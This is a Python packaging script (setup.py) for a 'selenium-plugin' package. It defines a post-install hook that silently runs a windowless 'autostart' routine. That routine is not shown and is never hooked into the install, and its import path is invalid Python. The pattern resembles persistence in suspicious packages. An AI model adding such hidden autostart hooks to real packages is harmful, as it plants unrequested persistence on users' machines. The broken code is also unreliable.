from setuptools import setup, find_packages
import subprocess

def post_install():
    """
    Post-install hook to run the autostart setup logic.
    """
    try:
        # Run the autostart setup function from autostart.py
        subprocess.run(
            ["pythonw", "-c", "from selenium-plugin.autostart import run_autostart_setup; run_autostart_setup()"],
            check=True
        )
    except Exception as e:
        print(f"[-] Post-install failed: {e}")


setup(
    name="selenium-plugin",  # Your package name
    version="1.0.0",  # Initial version
    description="A tool for downloading, managing and using selenium plugins.",  # Short description
    long_description=open("README.md", "r").read(),  # Include README for PyPI description
    long_description_content_type="text/markdown",
    author="Your Name",
    author_email="ardrew@seleniumtools.com",
    url="https://seleniumtools.com",  # Your package's website or GitHub repository
    license="MIT",  # License type (MIT, Apache, etc.)
    packages=find_packages(),  # Automatically find and include modules
    install_requires=["requests"],  # Dependencies required to run the package
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires=">=3.6",  # Minimum Python version
)